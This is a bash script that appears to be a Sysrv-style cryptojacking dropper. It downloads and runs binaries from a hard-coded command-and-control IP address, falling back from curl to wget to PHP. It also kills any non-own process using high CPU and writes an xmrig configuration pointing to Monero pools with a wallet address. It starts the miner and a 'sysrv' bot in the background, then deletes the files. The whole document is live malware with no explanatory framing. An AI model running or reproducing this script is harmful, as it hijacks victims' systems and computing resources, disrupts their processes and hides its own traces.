#!/bin/bash

cc="http://185.239.242.71"
xmr="network01"
sys="sysrv"

get() {
    echo "downloading $1"
    chattr -i $2; rm -rf $2
    curl -fsSL $1 > $2 || wget -q -O - $1 > $2 || php -r "file_put_contents('$2', file_get_contents('$1'));"
    chmod +x $2
}

# kill hich cpu usage proc
ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read pid; do
    cat /proc/$pid/cmdline | grep -a -E "$sys|$xmr"
    if [ $? -ne 0 ]; then
        kill -9 $pid
    fi
done

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
rm -rf flag.txt log.txt

# write config.json for xmrig
chattr -i config.json; rm -rf config.json; echo '{
    "autosave": false,
    "background": false,
    "watch": false,
    "donate-level": 0,
    "pools": [
        {"url": "pool.minexmr.com:5555", "user": "49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.linux"},
        {"url": "xmr.f2pool.com:13531", "user": "49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.linux", "pass": "x"}
    ]
}' > config.json

ps -fe | grep $xmr | grep -v grep
if [ $? -ne 0 ]; then
    if [ $(getconf LONG_BIT) = '64' ]; then
        get "$cc/xmr64" $xmr
    else
        get "$cc/xmr32" $xmr
    fi
    nohup ./$xmr 1>/dev/null 2>&1 &
fi


ps -fe | grep $sys | grep -v grep
if [ $? -ne 0 ]; then
    get "$cc/sysrv" $sys
    nohup ./$sys 1>/dev/null 2>&1 &
fi

sleep 3; rm -rf $sys config.json $xmr
